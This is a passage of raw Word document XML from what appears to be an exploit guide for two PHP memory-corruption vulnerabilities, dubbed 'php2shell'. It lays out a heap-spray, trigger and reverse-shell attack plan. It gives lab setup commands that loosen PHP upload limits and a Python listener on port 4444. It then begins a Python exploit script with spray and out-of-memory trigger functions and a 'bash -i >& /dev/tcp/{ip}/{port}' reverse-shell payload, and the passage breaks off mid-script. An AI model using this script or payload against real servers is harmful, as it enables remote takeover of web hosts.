        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>CVE-2026-109619</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Trigger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>OOM (giant body)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Fatal error (malformed input)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Domain</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Request memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Global memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Exploit timing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Same request / immediately after</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Next request (UAF)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Primitive</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Read/execute uninitialized buffer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Read/execute freed pointer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Chaining role</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Leak libc base address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Redirect control flow</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Exploit Strategy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The exploit has four phases:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHASE 1 — Heap spray: POST many small multipart parts, each containing the shellcode / ROP chain. Fills the PHP allocator with the payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHASE 2 — Trigger: POST a body that fires the longjmp path. For 109618: a 300+ MB multipart body (OOM). For 109619: a malformed multipart body (fatal error).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHASE 3 — Land: POST a normal request. PHP dereferences the corrupted memory (uninitialized or freed) and executes the sprayed payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHASE 4 — Payload: The shellcode / ROP chain spawns a reverse shell that connects back to the attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Virtual Environment Setup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Linux target (vulnerable web server)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ubuntu 22.04/24.04 with unpatched PHP 8.3.x or 8.4.x, Apache + mod_php.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sudo apt update &amp;&amp; sudo apt -y upgrade</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sudo apt install -y apache2 php libapache2-mod-php php-mbstring php-xml</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Confirm vulnerable version</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>php -v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Relax upload limits so a large body reaches the PHP parser</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sudo tee /etc/php/8.3/apache2/conf.d/99-php2shell.ini &gt;/dev/null &lt;&lt;'EOF'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>upload_max_filesize = 512M</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>post_max_size       = 512M</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>memory_limit        = 256M</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>max_execution_time  = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>EOF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Minimal multipart sink</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sudo tee /var/www/html/upload.php &gt;/dev/null &lt;&lt;'EOF'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>header('Content-Type: text/plain');</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "size=" . (int)($_SERVER['CONTENT_LENGTH'] ?? 0) . "\n";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "method=" . $_SERVER['REQUEST_METHOD'] . "\n";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if (!empty($_FILES['file']['name'])) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "file=" . basename($_FILES['file']['name']) . "\n";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "tmpsize=" . (int)$_FILES['file']['size'] . "\n";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if (!empty($_POST['p'])) { echo "post=" . strlen($_POST['p']) . "\n"; }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>EOF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sudo systemctl restart apache2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Key setting: memory_limit = 256M ensures a 300 MB body triggers OOM inside PHP (the 109618 path) rather than being rejected by Apache.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 Windows attacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Install Python 3, then:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>pip install requests</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># TCP listener for the reverse shell (run in a separate terminal):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python -c "import socket; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,"\</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>"socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',4444)); s.listen(1); print('listening');\</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>" c,a=s.accept(); print('conn',a); c.recv(4096)"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Put both VMs on the same LAN / host-only network. Note both IPs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. The Exploit Script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Save as php2shell_exploit.py on the Windows machine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import argparse, socket, struct, time, threading, requests</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build_cmd(ip, port):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return f"bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1; echo PHP2SHELL_PWNED_{port}"</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build_spray(cmd, chunk=4096, repeats=256):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    cmd_b = cmd.encode() + b"\x00"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    head = struct.pack("&lt;Q", 0x00007f00000000c3) * 64  # ret-gadget placeholder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    blob = (head + cmd_b + b"\x41" * (chunk - len(head + cmd_b))) * repeats</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return blob</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spray(s, tgt, port, blob):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = f"http://{tgt}:{port}/upload.php"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    n = max(1, len(blob) // 200_000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(n):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        part = blob[i*200_000:(i+1)*200_000]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">            s.post(url, files={'file':(f's{i}.bin',part,'application/octet-stream')},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                   timeout=30)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        except Exception: pass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[+] sprayed {len(blob)} bytes / {n} parts")</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trigger_oom(s, tgt, port, mb=300):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = f"http://{tgt}:{port}/upload.php"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    b = "----php2shell_oom"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    def gen():</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        yield f"--{b}\r\n".encode()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        yield (f'Content-Disposition: form-data; name="file"; '</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">               f'filename="big.bin\r\nContent-Type: application/octet-stream\r\n\r\n').encode()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        for _ in range(mb): yield b"A" * (1024*1024)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        yield f"\r\n--{b}--\r\n".encode()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
